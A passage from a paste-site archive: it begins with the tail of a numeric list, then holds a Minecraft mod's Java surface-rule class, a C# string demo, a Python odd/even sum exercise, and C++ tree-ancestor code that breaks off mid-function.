1 6 9 
1 6 10 
1 7 0 
1 7 2 
1 7 4 
1 7 6 
1 7 8 
1 7 10 
1 8 0 
1 8 1 
1 8 2 
1 8 3 
1 8 4 
1 8 5 
1 8 6 
1 8 7 
1 8 8 
1 8 9 
1 8 10 
1 9 0 
1 9 2 
1 9 4 
1 9 6 
1 9 8 
1 9 10 
1 10 0 
1 10 1 
1 10 2 
1 10 3 
1 10 4 
1 10 5 
1 10 6 
1 10 7 
1 10 8 
1 10 9 
1 10 10 
2 0 1 
2 0 3 
2 0 5 
2 0 7 
2 0 9 
2 1 0 
2 1 1 
2 1 2 
2 1 3 
2 1 4 
2 1 5 
2 1 6 
2 1 7 
2 1 8 
2 1 9 
2 1 10 
2 2 1 
2 2 3 
2 2 5 
2 2 7 
2 2 9 
2 3 0 
2 3 1 
2 3 2 
2 3 3 
2 3 4 
2 3 5 
2 3 6 
2 3 7 
2 3 8 
2 3 9 
2 3 10 
2 4 1 
2 4 3 
2 4 5 
2 4 7 
2 4 9 
2 5 0 
2 5 1 
2 5 2 
2 5 3 
2 5 4 
2 5 5 
2 5 6 
2 5 7 
2 5 8 
2 5 9 
2 5 10 
2 6 1 
2 6 3 
2 6 5 
2 6 7 
2 6 9 
2 7 0 
2 7 1 
2 7 2 
2 7 3 
2 7 4 
2 7 5 
2 7 6 
2 7 7 
2 7 8 
2 7 9 
2 7 10 
2 8 1 
2 8 3 
2 8 5 
2 8 7 
2 8 9 
2 9 0 
2 9 1 
2 9 2 
2 9 3 
2 9 4 
2 9 5 
2 9 6 
2 9 7 
2 9 8 
2 9 9 
2 9 10 
2 10 1 
2 10 3 
2 10 5 
2 10 7 
2 10 9 
3 0 1 
3 0 2 
3 0 3 
3 0 4 
3 0 5 
3 0 6 
3 0 7 
3 0 8 
3 0 9 
3 0 10 
3 1 0 
3 1 2 
3 1 4 
3 1 6 
3 1 8 
3 1 10 
3 2 0 
3 2 1 
3 2 2 
3 2 3 
3 2 4 
3 2 5 
3 2 6 
3 2 7 
3 2 8 
3 2 9 
3 2 10 
3 3 0 
3 3 2 
3 3 4 
3 3 6 
3 3 8 
3 3 10 
3 4 0 
3 4 1 
3 4 2 
3 4 3 
3 4 4 
3 4 5 
3 4 6 
3 4 7 
3 4 8 
3 4 9 
3 4 10 
3 5 0 
3 5 2 
3 5 4 
3 5 6 
3 5 8 
3 5 10 
3 6 0 
3 6 1 
3 6 2 
3 6 3 
3 6 4 
3 6 5 
3 6 6 
3 6 7 
3 6 8 
3 6 9 
3 6 10 
3 7 0 
3 7 2 
3 7 4 
3 7 6 
3 7 8 
3 7 10 
3 8 0 
3 8 1 
3 8 2 
3 8 3 
3 8 4 
3 8 5 
3 8 6 
3 8 7 
3 8 8 
3 8 9 
3 8 10 
3 9 0 
3 9 2 
3 9 4 
3 9 6 
3 9 8 
3 9 10 
3 10 0 
3 10 1 
3 10 2 
3 10 3 
3 10 4 
3 10 5 
3 10 6 
3 10 7 
3 10 8 
3 10 9 
3 10 10 
4 0 1 
4 0 3 
4 0 5 
4 0 7 
4 0 9 
4 1 0 
4 1 1 
4 1 2 
4 1 3 
4 1 4 
4 1 5 
4 1 6 
4 1 7 
4 1 8 
4 1 9 
4 1 10 
4 2 1 
4 2 3 
4 2 5 
4 2 7 
4 2 9 
4 3 0 
4 3 1 
4 3 2 
4 3 3 
4 3 4 
4 3 5 
4 3 6 
4 3 7 
4 3 8 
4 3 9 
4 3 10 
4 4 1 
4 4 3 
4 4 5 
4 4 7 
4 4 9 
4 5 0 
4 5 1 
4 5 2 
4 5 3 
4 5 4 
4 5 5 
4 5 6 
4 5 7 
4 5 8 
4 5 9 
4 5 10 
4 6 1 
4 6 3 
4 6 5 
4 6 7 
4 6 9 
4 7 0 
4 7 1 
4 7 2 
4 7 3 
4 7 4 
4 7 5 
4 7 6 
4 7 7 
4 7 8 
4 7 9 
4 7 10 
4 8 1 
4 8 3 
4 8 5 
4 8 7 
4 8 9 
4 9 0 
4 9 1 
4 9 2 
4 9 3 
4 9 4 
4 9 5 
4 9 6 
4 9 7 
4 9 8 
4 9 9 
4 9 10 
4 10 1 
4 10 3 
4 10 5 
4 10 7 
4 10 9 
5 0 1 
5 0 2 
5 0 3 
5 0 4 
5 0 5 
5 0 6 
5 0 7 
5 0 8 
5 0 9 
5 0 10 
5 1 0 
5 1 2 
5 1 4 
5 1 6 
5 1 8 
5 1 10 
5 2 0 
5 2 1 
5 2 2 
5 2 3 
5 2 4 
5 2 5 
5 2 6 
5 2 7 
5 2 8 
5 2 9 
5 2 10 
5 3 0 
5 3 2 
5 3 4 
5 3 6 
5 3 8 
5 3 10 
5 4 0 
5 4 1 
5 4 2 
5 4 3 
5 4 4 
5 4 5 
5 4 6 
5 4 7 
5 4 8 
5 4 9 
5 4 10 
5 5 0 
5 5 2 
5 5 4 
5 5 6 
5 5 8 
5 5 10 
5 6 0 
5 6 1 
5 6 2 
5 6 3 
5 6 4 
5 6 5 
5 6 6 
5 6 7 
5 6 8 
5 6 9 
5 6 10 
5 7 0 
5 7 2 
5 7 4 
5 7 6 
5 7 8 
5 7 10 
5 8 0 
5 8 1 
5 8 2 
5 8 3 
5 8 4 
5 8 5 
5 8 6 
5 8 7 
5 8 8 
5 8 9 
5 8 10 
5 9 0 
5 9 2 
5 9 4 
5 9 6 
5 9 8 
5 9 10 
5 10 0 
5 10 1 
5 10 2 
5 10 3 
5 10 4 
5 10 5 
5 10 6 
5 10 7 
5 10 8 
5 10 9 
5 10 10 
6 0 1 
6 0 3 
6 0 5 
6 0 7 
6 0 9 
6 1 0 
6 1 1 
6 1 2 
6 1 3 
6 1 4 
6 1 5 
6 1 6 
6 1 7 
6 1 8 
6 1 9 
6 1 10 
6 2 1 
6 2 3 
6 2 5 
6 2 7 
6 2 9 
6 3 0 
6 3 1 
6 3 2 
6 3 3 
6 3 4 
6 3 5 
6 3 6 
6 3 7 
6 3 8 
6 3 9 
6 3 10 
6 4 1 
6 4 3 
6 4 5 
6 4 7 
6 4 9 
6 5 0 
6 5 1 
6 5 2 
6 5 3 
6 5 4 
6 5 5 
6 5 6 
6 5 7 
6 5 8 
6 5 9 
6 5 10 
6 6 1 
6 6 3 
6 6 5 
6 6 7 
6 6 9 
6 7 0 
6 7 1 
6 7 2 
6 7 3 
6 7 4 
6 7 5 
6 7 6 
6 7 7 
6 7 8 
6 7 9 
6 7 10 
6 8 1 
6 8 3 
6 8 5 
6 8 7 
6 8 9 
6 9 0 
6 9 1 
6 9 2 
6 9 3 
6 9 4 
6 9 5 
6 9 6 
6 9 7 
6 9 8 
6 9 9 
6 9 10 
6 10 1 
6 10 3 
6 10 5 
6 10 7 
6 10 9 
7 0 1 
7 0 2 
7 0 3 
7 0 4 
7 0 5 
7 0 6 
7 0 7 
7 0 8 
7 0 9 
7 0 10 
7 1 0 
7 1 2 
7 1 4 
7 1 6 
7 1 8 
7 1 10 
7 2 0 
7 2 1 
7 2 2 
7 2 3 
7 2 4 
7 2 5 
7 2 6 
7 2 7 
7 2 8 
7 2 9 
7 2 10 
7 3 0 
7 3 2 
7 3 4 
7 3 6 
7 3 8 
7 3 10 
7 4 0 
7 4 1 
7 4 2 
7 4 3 
7 4 4 
7 4 5 
7 4 6 
7 4 7 
7 4 8 
7 4 9 
7 4 10 
7 5 0 
7 5 2 
7 5 4 
7 5 6 
7 5 8 
7 5 10 
7 6 0 
7 6 1 
7 6 2 
7 6 3 
7 6 4 
7 6 5 
7 6 6 
7 6 7 
7 6 8 
7 6 9 
7 6 10 
7 7 0 
7 7 2 
7 7 4 
7 7 6 
7 7 8 
7 7 10 
7 8 0 
7 8 1 
7 8 2 
7 8 3 
7 8 4 
7 8 5 
7 8 6 
7 8 7 
7 8 8 
7 8 9 
7 8 10 
7 9 0 
7 9 2 
7 9 4 
7 9 6 
7 9 8 
7 9 10 
7 10 0 
7 10 1 
7 10 2 
7 10 3 
7 10 4 
7 10 5 
7 10 6 
7 10 7 
7 10 8 
7 10 9 
7 10 10 
8 0 1 
8 0 3 
8 0 5 
8 0 7 
8 0 9 
8 1 0 
8 1 1 
8 1 2 
8 1 3 
8 1 4 
8 1 5 
8 1 6 
8 1 7 
8 1 8 
8 1 9 
8 1 10 
8 2 1 
8 2 3 
8 2 5 
8 2 7 
8 2 9 
8 3 0 
8 3 1 
8 3 2 
8 3 3 
8 3 4 
8 3 5 
8 3 6 
8 3 7 
8 3 8 
8 3 9 
8 3 10 
8 4 1 
8 4 3 
8 4 5 
8 4 7 
8 4 9 
8 5 0 
8 5 1 
8 5 2 
8 5 3 
8 5 4 
8 5 5 
8 5 6 
8 5 7 
8 5 8 
8 5 9 
8 5 10 
8 6 1 
8 6 3 
8 6 5 
8 6 7 
8 6 9 
8 7 0 
8 7 1 
8 7 2 
8 7 3 
8 7 4 
8 7 5 
8 7 6 
8 7 7 
8 7 8 
8 7 9 
8 7 10 
8 8 1 
8 8 3 
8 8 5 
8 8 7 
8 8 9 
8 9 0 
8 9 1 
8 9 2 
8 9 3 
8 9 4 
8 9 5 
8 9 6 
8 9 7 
8 9 8 
8 9 9 
8 9 10 
8 10 1 
8 10 3 
8 10 5 
8 10 7 
8 10 9 
9 0 1 
9 0 2 
9 0 3 
9 0 4 
9 0 5 
9 0 6 
9 0 7 
9 0 8 
9 0 9 
9 0 10 
9 1 0 
9 1 2 
9 1 4 
9 1 6 
9 1 8 
9 1 10 
9 2 0 
9 2 1 
9 2 2 
9 2 3 
9 2 4 
9 2 5 
9 2 6 
9 2 7 
9 2 8 
9 2 9 
9 2 10 
9 3 0 
9 3 2 
9 3 4 
9 3 6 
9 3 8 
9 3 10 
9 4 0 
9 4 1 
9 4 2 
9 4 3 
9 4 4 
9 4 5 
9 4 6 
9 4 7 
9 4 8 
9 4 9 
9 4 10 
9 5 0 
9 5 2 
9 5 4 
9 5 6 
9 5 8 
9 5 10 
9 6 0 
9 6 1 
9 6 2 
9 6 3 
9 6 4 
9 6 5 
9 6 6 
9 6 7 
9 6 8 
9 6 9 
9 6 10 
9 7 0 
9 7 2 
9 7 4 
9 7 6 
9 7 8 
9 7 10 
9 8 0 
9 8 1 
9 8 2 
9 8 3 
9 8 4 
9 8 5 
9 8 6 
9 8 7 
9 8 8 
9 8 9 
9 8 10 
9 9 0 
9 9 2 
9 9 4 
9 9 6 
9 9 8 
9 9 10 
9 10 0 
9 10 1 
9 10 2 
9 10 3 
9 10 4 
9 10 5 
9 10 6 
9 10 7 
9 10 8 
9 10 9 
9 10 10 
10 0 1 
10 0 3 
10 0 5 
10 0 7 
10 0 9 
10 1 0 
10 1 1 
10 1 2 
10 1 3 
10 1 4 
10 1 5 
10 1 6 
10 1 7 
10 1 8 
10 1 9 
10 1 10 
10 2 1 
10 2 3 
10 2 5 
10 2 7 
10 2 9 
10 3 0 
10 3 1 
10 3 2 
10 3 3 
10 3 4 
10 3 5 
10 3 6 
10 3 7 
10 3 8 
10 3 9 
10 3 10 
10 4 1 
10 4 3 
10 4 5 
10 4 7 
10 4 9 
10 5 0 
10 5 1 
10 5 2 
10 5 3 
10 5 4 
10 5 5 
10 5 6 
10 5 7 
10 5 8 
10 5 9 
10 5 10 
10 6 1 
10 6 3 
10 6 5 
10 6 7 
10 6 9 
10 7 0 
10 7 1 
10 7 2 
10 7 3 
10 7 4 
10 7 5 
10 7 6 
10 7 7 
10 7 8 
10 7 9 
10 7 10 
10 8 1 
10 8 3 
10 8 5 
10 8 7 
10 8 9 
10 9 0 
10 9 1 
10 9 2 
10 9 3 
10 9 4 
10 9 5 
10 9 6 
10 9 7 
10 9 8 
10 9 9 
10 9 10 
10 10 1 
10 10 3 
10 10 5 
10 10 7 
10 10 9 


*/"
G1NxWbVL,MysticSurfaceRules,jayhillx,Java,Thursday 29th of February 2024 01:09:18 PM CDT,"package com.mysticsbiomes.common.worldgen;

import com.google.common.collect.ImmutableList;
import com.mysticsbiomes.core.init.MysticBiomes;
import com.google.common.collect.ImmutableList.Builder;
import net.minecraft.world.level.biome.Biomes;
import net.minecraft.world.level.block.Block;
import net.minecraft.world.level.block.Blocks;
import net.minecraft.world.level.levelgen.Noises;
import net.minecraft.world.level.levelgen.SurfaceRules;
import net.minecraft.world.level.levelgen.SurfaceRules.*;
import net.minecraft.world.level.levelgen.VerticalAnchor;

public class MysticSurfaceRules {
    private static final SurfaceRules.RuleSource AIR = makeStateRule(Blocks.AIR);
    private static final SurfaceRules.RuleSource BEDROCK = makeStateRule(Blocks.BEDROCK);
    private static final SurfaceRules.RuleSource WHITE_TERRACOTTA = makeStateRule(Blocks.WHITE_TERRACOTTA);
    private static final SurfaceRules.RuleSource ORANGE_TERRACOTTA = makeStateRule(Blocks.ORANGE_TERRACOTTA);
    private static final SurfaceRules.RuleSource TERRACOTTA = makeStateRule(Blocks.TERRACOTTA);
    private static final SurfaceRules.RuleSource RED_SAND = makeStateRule(Blocks.RED_SAND);
    private static final SurfaceRules.RuleSource RED_SANDSTONE = makeStateRule(Blocks.RED_SANDSTONE);
    private static final SurfaceRules.RuleSource STONE = makeStateRule(Blocks.STONE);
    private static final SurfaceRules.RuleSource DEEPSLATE = makeStateRule(Blocks.DEEPSLATE);
    private static final SurfaceRules.RuleSource DIRT = makeStateRule(Blocks.DIRT);
    private static final SurfaceRules.RuleSource PODZOL = makeStateRule(Blocks.PODZOL);
    private static final SurfaceRules.RuleSource COARSE_DIRT = makeStateRule(Blocks.COARSE_DIRT);
    private static final SurfaceRules.RuleSource MYCELIUM = makeStateRule(Blocks.MYCELIUM);
    private static final SurfaceRules.RuleSource GRASS_BLOCK = makeStateRule(Blocks.GRASS_BLOCK);
    private static final SurfaceRules.RuleSource CALCITE = makeStateRule(Blocks.CALCITE);
    private static final SurfaceRules.RuleSource GRAVEL = makeStateRule(Blocks.GRAVEL);
    private static final SurfaceRules.RuleSource SAND = makeStateRule(Blocks.SAND);
    private static final SurfaceRules.RuleSource SANDSTONE = makeStateRule(Blocks.SANDSTONE);
    private static final SurfaceRules.RuleSource PACKED_ICE = makeStateRule(Blocks.PACKED_ICE);
    private static final SurfaceRules.RuleSource SNOW_BLOCK = makeStateRule(Blocks.SNOW_BLOCK);
    private static final SurfaceRules.RuleSource POWDER_SNOW = makeStateRule(Blocks.POWDER_SNOW);
    private static final SurfaceRules.RuleSource ICE = makeStateRule(Blocks.ICE);
    private static final SurfaceRules.RuleSource WATER = makeStateRule(Blocks.WATER);

    private static RuleSource makeStateRule(Block block) {
        return SurfaceRules.state(block.defaultBlockState());
    }

    public static RuleSource overworld() {
        return overworldLike(true, false, true);
    }

    public static RuleSource overworldLike(boolean surface, boolean nether, boolean overworld) {
        ConditionSource conditionSource = SurfaceRules.yBlockCheck(VerticalAnchor.absolute(97), 2);
        ConditionSource conditionSource1 = SurfaceRules.yBlockCheck(VerticalAnchor.absolute(256), 0);
        ConditionSource conditionSource2 = SurfaceRules.yStartCheck(VerticalAnchor.absolute(63), -1);
        ConditionSource conditionSource3 = SurfaceRules.yStartCheck(VerticalAnchor.absolute(74), 1);
        ConditionSource conditionSource4 = SurfaceRules.yBlockCheck(VerticalAnchor.absolute(62), 0);
        ConditionSource conditionSource5 = SurfaceRules.yBlockCheck(VerticalAnchor.absolute(63), 0);
        ConditionSource conditionSource6 = SurfaceRules.waterBlockCheck(-1, 0);
        ConditionSource conditionSource7 = SurfaceRules.waterBlockCheck(0, 0);
        ConditionSource conditionSource8 = SurfaceRules.waterStartCheck(-6, -1);
        ConditionSource conditionSource9 = SurfaceRules.hole();
        ConditionSource conditionSource10 = SurfaceRules.isBiome(Biomes.FROZEN_OCEAN, Biomes.DEEP_FROZEN_OCEAN);
        ConditionSource conditionSource11 = SurfaceRules.steep();
        RuleSource ruleSource = SurfaceRules.sequence(SurfaceRules.ifTrue(conditionSource7, GRASS_BLOCK), DIRT);
        RuleSource ruleSource1 = SurfaceRules.sequence(SurfaceRules.ifTrue(SurfaceRules.ON_CEILING, SANDSTONE), SAND);
        RuleSource ruleSource2 = SurfaceRules.sequence(SurfaceRules.ifTrue(SurfaceRules.ON_CEILING, STONE), GRAVEL);
        ConditionSource conditionSource12 = SurfaceRules.isBiome(Biomes.WARM_OCEAN, Biomes.BEACH, Biomes.SNOWY_BEACH);
        ConditionSource conditionSource13 = SurfaceRules.isBiome(Biomes.DESERT);
        RuleSource ruleSource3 = SurfaceRules.sequence(SurfaceRules.ifTrue(SurfaceRules.isBiome(Biomes.STONY_PEAKS), SurfaceRules.sequence(SurfaceRules.ifTrue(SurfaceRules.noiseCondition(Noises.CALCITE, -0.0125D, 0.0125D), CALCITE), STONE)), SurfaceRules.ifTrue(SurfaceRules.isBiome(Biomes.STONY_SHORE), SurfaceRules.sequence(SurfaceRules.ifTrue(SurfaceRules.noiseCondition(Noises.GRAVEL, -0.05D, 0.05D), ruleSource2), STONE)), SurfaceRules.ifTrue(SurfaceRules.isBiome(Biomes.WINDSWEPT_HILLS), SurfaceRules.ifTrue(surfaceNoiseAbove(1.0D), STONE)), SurfaceRules.ifTrue(conditionSource12, ruleSource1), SurfaceRules.ifTrue(conditionSource13, ruleSource1), SurfaceRules.ifTrue(SurfaceRules.isBiome(Biomes.DRIPSTONE_CAVES), STONE));
        RuleSource ruleSource4 = SurfaceRules.ifTrue(SurfaceRules.noiseCondition(Noises.POWDER_SNOW, 0.45D, 0.58D), SurfaceRules.ifTrue(conditionSource7, POWDER_SNOW));
        RuleSource ruleSource5 = SurfaceRules.ifTrue(SurfaceRules.noiseCondition(Noises.POWDER_SNOW, 0.35D, 0.6D), SurfaceRules.ifTrue(conditionSource7, POWDER_SNOW));
        RuleSource ruleSource6 = SurfaceRules.sequence(SurfaceRules.ifTrue(SurfaceRules.isBiome(Biomes.FROZEN_PEAKS), SurfaceRules.sequence(SurfaceRules.ifTrue(conditionSource11, PACKED_ICE), SurfaceRules.ifTrue(SurfaceRules.noiseCondition(Noises.PACKED_ICE, -0.5D, 0.2D), PACKED_ICE), SurfaceRules.ifTrue(SurfaceRules.noiseCondition(Noises.ICE, -0.0625D, 0.025D), ICE), SurfaceRules.ifTrue(conditionSource7, SNOW_BLOCK))), SurfaceRules.ifTrue(SurfaceRules.isBiome(Biomes.SNOWY_SLOPES), SurfaceRules.sequence(SurfaceRules.ifTrue(conditionSource11, STONE), ruleSource4, SurfaceRules.ifTrue(conditionSource7, SNOW_BLOCK))), SurfaceRules.ifTrue(SurfaceRules.isBiome(Biomes.JAGGED_PEAKS), STONE), SurfaceRules.ifTrue(SurfaceRules.isBiome(Biomes.GROVE), SurfaceRules.sequence(ruleSource4, DIRT)), ruleSource3, SurfaceRules.ifTrue(SurfaceRules.isBiome(Biomes.WINDSWEPT_SAVANNA), SurfaceRules.ifTrue(surfaceNoiseAbove(1.75D), STONE)), SurfaceRules.ifTrue(SurfaceRules.isBiome(Biomes.WINDSWEPT_GRAVELLY_HILLS), SurfaceRules.sequence(SurfaceRules.ifTrue(surfaceNoiseAbove(2.0D), ruleSource2), SurfaceRules.ifTrue(surfaceNoiseAbove(1.0D), STONE), SurfaceRules.ifTrue(surfaceNoiseAbove(-1.0D), DIRT), ruleSource2)), DIRT);
        RuleSource ruleSource7 = SurfaceRules.sequence(SurfaceRules.ifTrue(SurfaceRules.isBiome(Biomes.FROZEN_PEAKS), SurfaceRules.sequence(SurfaceRules.ifTrue(conditionSource11, PACKED_ICE), SurfaceRules.ifTrue(SurfaceRules.noiseCondition(Noises.PACKED_ICE, 0.0D, 0.2D), PACKED_ICE), SurfaceRules.ifTrue(SurfaceRules.noiseCondition(Noises.ICE, 0.0D, 0.025D), ICE), SurfaceRules.ifTrue(conditionSource7, SNOW_BLOCK))), SurfaceRules.ifTrue(SurfaceRules.isBiome(Biomes.SNOWY_SLOPES), SurfaceRules.sequence(SurfaceRules.ifTrue(conditionSource11, STONE), ruleSource5, SurfaceRules.ifTrue(conditionSource7, SNOW_BLOCK))), SurfaceRules.ifTrue(SurfaceRules.isBiome(Biomes.JAGGED_PEAKS), SurfaceRules.sequence(SurfaceRules.ifTrue(conditionSource11, STONE), SurfaceRules.ifTrue(conditionSource7, SNOW_BLOCK))), SurfaceRules.ifTrue(SurfaceRules.isBiome(Biomes.GROVE), SurfaceRules.sequence(ruleSource5, SurfaceRules.ifTrue(conditionSource7, SNOW_BLOCK))), ruleSource3, SurfaceRules.ifTrue(SurfaceRules.isBiome(Biomes.WINDSWEPT_SAVANNA), SurfaceRules.sequence(SurfaceRules.ifTrue(surfaceNoiseAbove(1.75D), STONE), SurfaceRules.ifTrue(surfaceNoiseAbove(-0.5D), COARSE_DIRT))), SurfaceRules.ifTrue(SurfaceRules.isBiome(Biomes.WINDSWEPT_GRAVELLY_HILLS), SurfaceRules.sequence(SurfaceRules.ifTrue(surfaceNoiseAbove(2.0D), ruleSource2), SurfaceRules.ifTrue(surfaceNoiseAbove(1.0D), STONE), SurfaceRules.ifTrue(surfaceNoiseAbove(-1.0D), ruleSource), ruleSource2)), SurfaceRules.ifTrue(SurfaceRules.isBiome(Biomes.OLD_GROWTH_PINE_TAIGA, Biomes.OLD_GROWTH_SPRUCE_TAIGA), SurfaceRules.sequence(SurfaceRules.ifTrue(surfaceNoiseAbove(1.75D), COARSE_DIRT), SurfaceRules.ifTrue(surfaceNoiseAbove(-0.95D), PODZOL))), SurfaceRules.ifTrue(SurfaceRules.isBiome(Biomes.ICE_SPIKES), SurfaceRules.ifTrue(conditionSource7, SNOW_BLOCK)), SurfaceRules.ifTrue(SurfaceRules.isBiome(Biomes.MUSHROOM_FIELDS), MYCELIUM), ruleSource);
        ConditionSource conditionSource14 = SurfaceRules.noiseCondition(Noises.SURFACE, -0.909D, -0.5454D);
        ConditionSource conditionSource15 = SurfaceRules.noiseCondition(Noises.SURFACE, -0.1818D, 0.1818D);
        ConditionSource conditionSource16 = SurfaceRules.noiseCondition(Noises.SURFACE, 0.5454D, 0.909D);
                                                    // mysticRule(),
        RuleSource ruleSource8 = SurfaceRules.sequence(mysticRule(), SurfaceRules.ifTrue(SurfaceRules.ON_FLOOR, SurfaceRules.sequence(SurfaceRules.ifTrue(SurfaceRules.isBiome(Biomes.WOODED_BADLANDS), SurfaceRules.ifTrue(conditionSource, SurfaceRules.sequence(SurfaceRules.ifTrue(conditionSource14, COARSE_DIRT), SurfaceRules.ifTrue(conditionSource15, COARSE_DIRT), SurfaceRules.ifTrue(conditionSource16, COARSE_DIRT), ruleSource))), SurfaceRules.ifTrue(SurfaceRules.isBiome(Biomes.SWAMP), SurfaceRules.ifTrue(conditionSource4, SurfaceRules.ifTrue(SurfaceRules.not(conditionSource5), SurfaceRules.ifTrue(SurfaceRules.noiseCondition(Noises.SWAMP, 0.0D), WATER)))))), SurfaceRules.ifTrue(SurfaceRules.isBiome(Biomes.BADLANDS, Biomes.ERODED_BADLANDS, Biomes.WOODED_BADLANDS), SurfaceRules.sequence(SurfaceRules.ifTrue(SurfaceRules.ON_FLOOR, SurfaceRules.sequence(SurfaceRules.ifTrue(conditionSource1, ORANGE_TERRACOTTA), SurfaceRules.ifTrue(conditionSource3, SurfaceRules.sequence(SurfaceRules.ifTrue(conditionSource14, TERRACOTTA), SurfaceRules.ifTrue(conditionSource15, TERRACOTTA), SurfaceRules.ifTrue(conditionSource16, TERRACOTTA), SurfaceRules.bandlands())), SurfaceRules.ifTrue(conditionSource6, SurfaceRules.sequence(SurfaceRules.ifTrue(SurfaceRules.ON_CEILING, RED_SANDSTONE), RED_SAND)), SurfaceRules.ifTrue(SurfaceRules.not(conditionSource9), ORANGE_TERRACOTTA), SurfaceRules.ifTrue(conditionSource8, WHITE_TERRACOTTA), ruleSource2)), SurfaceRules.ifTrue(conditionSource2, SurfaceRules.sequence(SurfaceRules.ifTrue(conditionSource5, SurfaceRules.ifTrue(SurfaceRules.not(conditionSource3), ORANGE_TERRACOTTA)), SurfaceRules.bandlands())), SurfaceRules.ifTrue(SurfaceRules.UNDER_FLOOR, SurfaceRules.ifTrue(conditionSource8, WHITE_TERRACOTTA)))), SurfaceRules.ifTrue(SurfaceRules.ON_FLOOR, SurfaceRules.ifTrue(conditionSource6, SurfaceRules.sequence(SurfaceRules.ifTrue(conditionSource10, SurfaceRules.ifTrue(conditionSource9, SurfaceRules.sequence(SurfaceRules.ifTrue(conditionSource7, AIR), SurfaceRules.ifTrue(SurfaceRules.temperature(), ICE), WATER))), ruleSource7))), SurfaceRules.ifTrue(conditionSource8, SurfaceRules.sequence(SurfaceRules.ifTrue(SurfaceRules.ON_FLOOR, SurfaceRules.ifTrue(conditionSource10, SurfaceRules.ifTrue(conditionSource9, WATER))), SurfaceRules.ifTrue(SurfaceRules.UNDER_FLOOR, ruleSource6), SurfaceRules.ifTrue(conditionSource12, SurfaceRules.ifTrue(SurfaceRules.DEEP_UNDER_FLOOR, SANDSTONE)), SurfaceRules.ifTrue(conditionSource13, SurfaceRules.ifTrue(SurfaceRules.VERY_DEEP_UNDER_FLOOR, SANDSTONE)))), SurfaceRules.ifTrue(SurfaceRules.ON_FLOOR, SurfaceRules.sequence(SurfaceRules.ifTrue(SurfaceRules.isBiome(Biomes.FROZEN_PEAKS, Biomes.JAGGED_PEAKS), STONE), SurfaceRules.ifTrue(SurfaceRules.isBiome(Biomes.WARM_OCEAN, Biomes.LUKEWARM_OCEAN, Biomes.DEEP_LUKEWARM_OCEAN), ruleSource1), ruleSource2)));
        RuleSource ruleSource9 = SurfaceRules.ifTrue(SurfaceRules.abovePreliminarySurface(), ruleSource8);

        Builder<RuleSource> builder = ImmutableList.builder();
        if (nether) {
            builder.add(SurfaceRules.ifTrue(SurfaceRules.not(SurfaceRules.verticalGradient(""bedrock_roof"", VerticalAnchor.belowTop(5), VerticalAnchor.top())), BEDROCK));
        }
        if (overworld) {
            builder.add(SurfaceRules.ifTrue(SurfaceRules.verticalGradient(""bedrock_floor"", VerticalAnchor.bottom(), VerticalAnchor.aboveBottom(5)), BEDROCK));
        }
        builder.add(surface ? ruleSource9 : ruleSource8);
        builder.add(SurfaceRules.ifTrue(SurfaceRules.verticalGradient(""deepslate"", VerticalAnchor.absolute(0), VerticalAnchor.absolute(8)), DEEPSLATE));
        return SurfaceRules.sequence(builder.build().toArray(RuleSource[]::new));
    }

    /**
     * Mystic's Biomes world gen surface rules.
     */
    private static SurfaceRules.RuleSource mysticRule() {

        return SurfaceRules.sequence(SurfaceRules.ifTrue(SurfaceRules.waterBlockCheck(-1, 0), SurfaceRules.sequence(SurfaceRules.ifTrue(SurfaceRules.isBiome(MysticBiomes.BAMBOO_BLOSSOM_FOREST.getKey()), SurfaceRules.ifTrue(surfaceNoiseAbove(1.75D), PODZOL)), SurfaceRules.ifTrue(surfaceNoiseAbove(-0.95D), GRASS_BLOCK))));
    }

    private static SurfaceRules.ConditionSource surfaceNoiseAbove(double value) {
        return SurfaceRules.noiseCondition(Noises.SURFACE, value / 8.25D, Double.MAX_VALUE);
    }

}"
vrfmEMEi,Untitled,Abdula_2314124,C#,Thursday 29th of February 2024 01:07:40 PM CDT,"using System;

namespace String
{
    class Program
    {
        static void Main(string[] args)
        {
            string name = ""EnemyName:jack"" +
                ""PlayerName:Micle"" +
                ""EnemyName:jack"";

            Console.WriteLine(""Hello"" + "" World"");// Hello World

            string[] test = name.Split(""\n"");

            for (int i = 0; i < test.Length; i++)
            {
                Console.WriteLine(test[i]);
            }
            
            name.Trim();
            
            Console.WriteLine($""Hello {name}"");

        }
    }
}
"
hw5znuiq,Untitled,h1n0t0r1,Python,Thursday 29th of February 2024 01:05:36 PM CDT,"# Read user input
nums = int(input())
odd_sum = 0
odd_min = None
odd_max = None
even_sum = 0
even_min = None
even_max = None

# Logic
for i in range(1, nums + 1):
    user_input = float(input())
    if i == 1:
        odd_max = user_input
        odd_min = user_input
        odd_sum += user_input
    elif i == 2:
        even_max = user_input
        even_min = user_input
        even_sum += user_input
    else:
        if i % 2 == 0:
            even_sum += user_input
            if user_input > even_max:
                even_max = user_input
            if user_input < even_min:
                even_min = user_input
        else:
            odd_sum += user_input
            if user_input > odd_max:
                odd_max = user_input
            if user_input < odd_min:
                odd_min = user_input
# Print Output
print(f'OddSum={odd_sum:.2f},')
if odd_min is not None:
    print(f'OddMin={odd_min:.2f},')
else:
    print('OddMin=No,')

if odd_max is not None:
    print(f'OddMax={odd_max:.2f},')
else:
    print('OddMax=No,')

print(f'EvenSum={even_sum:.2f},')
if even_min is not None:
    print(f'EvenMin={even_min:.2f},')
else:
    print('EvenMin=No,')

if even_max is not None:
    print(f'EvenMax={even_max:.2f}')
else:
    print('EvenMax=No')

"
4UwkxfgE,Untitled,Josif_tepe,C++,Thursday 29th of February 2024 12:57:18 PM CDT,"#include <iostream>
#include <vector>
//#include <bits/stdc++.h>
#include <cmath>
#include <queue>
#include <cstring>
#include <algorithm>
using namespace std;
typedef long long ll;
const int maxn = 30010;
const int logn = 20;
const int INF = 2e9;
int up[maxn][logn], n;
vector<pair<int, int>> graph[maxn];
int depth[maxn], parent[maxn];
int dp[logn][maxn];
ll dist[maxn];
int max_edge[logn][maxn], min_edge[logn][maxn];
void dfs(int node, int prev, int level) {
    depth[node] = level;
    parent[node] = prev;
    dp[0][node] = prev;
    for(int i = 0; i < (int) graph[node].size(); i++) {
        int neighbour = graph[node][i].first;
        int weight = graph[node][i].second;
        if(prev != neighbour) {
            dist[neighbour] = dist[node] + weight;
            min_edge[0][neighbour] = weight;
            max_edge[0][neighbour] = weight;
            dfs(neighbour, node, level + 1);
        }
    }
}

void preprocess() {
    memset(up, -1, sizeof up);
    
    for(int i = 0; i < n; i++) {
        up[i][0] = parent[i];
        
    }
    for(int j = 1; (1 << j) < n; j++) {
        for(int i = 0; i < n; i++) {
            if(up[i][j - 1] != -1) {
                up[i][j] = up[up[i][j - 1]][j - 1];
